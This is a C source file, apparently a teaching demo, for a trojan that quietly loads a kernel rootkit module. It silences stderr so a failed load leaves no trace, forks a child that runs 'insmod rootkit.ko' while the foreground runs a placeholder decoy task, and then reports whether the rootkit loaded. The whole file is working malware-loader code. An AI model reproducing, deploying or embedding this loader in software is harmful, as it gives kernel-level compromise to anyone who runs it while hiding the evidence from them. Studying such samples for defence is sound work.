#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


bool payload_status = false;


void sigchld_handler(int signal) {
    int status, exit_status;

    switch (signal) {
        case SIGCHLD:
            waitpid(0, &status, WNOHANG);
            if (WIFEXITED(status)) {
                exit_status = WEXITSTATUS(status);
                if (exit_status == 0) payload_status = true;
            }
            break;
        default:
            break;
    }
}


int main() {
    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    bool rootkit = true;

    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        // Failed to sigaction
        rootkit = false;
    }

    if (rootkit) {
        // Suppress stderr in case the rootkit fails to load
        FILE* file = fopen("/dev/null", "w");
        int fd = fileno(file);

        dup2(fd, STDERR_FILENO);
        fclose(file);

        char* payload[] = {"insmod", "rootkit.ko", NULL};
        pid_t pid = fork();
        if (pid == 0) {
            if (execvp(payload[0], payload) < 0) {
                // Failed to load the rootkit
                exit(EXIT_FAILURE);
            }
        }
    }

    printf("The trojan is loading the rootkit in the background.\n");
    printf("Ideally it should now do some useful task to trick the user.\n");
    printf("***************** Some useful task *****************\n");

    sleep(3); // Placeholder for some useful task

    if (payload_status) {
        printf("The trojan has loaded the rootkit.\n");
    }
    else {
        printf("The trojan has failed to load the rootkit.\n");
    }

    return 0;
}